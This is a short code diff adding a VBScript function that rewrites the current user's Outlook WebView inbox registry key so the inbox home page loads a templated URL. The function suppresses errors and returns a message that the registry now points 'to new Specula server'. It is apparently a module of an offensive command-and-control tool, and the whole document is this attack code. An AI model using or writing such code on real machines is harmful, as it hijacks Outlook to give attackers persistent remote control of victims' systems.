@@ -1,0 +1,7 @@
+Function Execute_MigrateHomepage()
+	On Error Resume Next
+	version = left(window.external.OutlookApplication.Version,4)
+	basepath = "software\microsoft\office\" + version + "\outlook\webview\inbox"
+	SetValue_HKCU_Registry = SetRegValue_HKCU(basepath, "REG_SZ", "URL", {{homepageurl}})
+	Execute_MigrateHomepage = "Registry updated to point to new Specula server"
+End Function
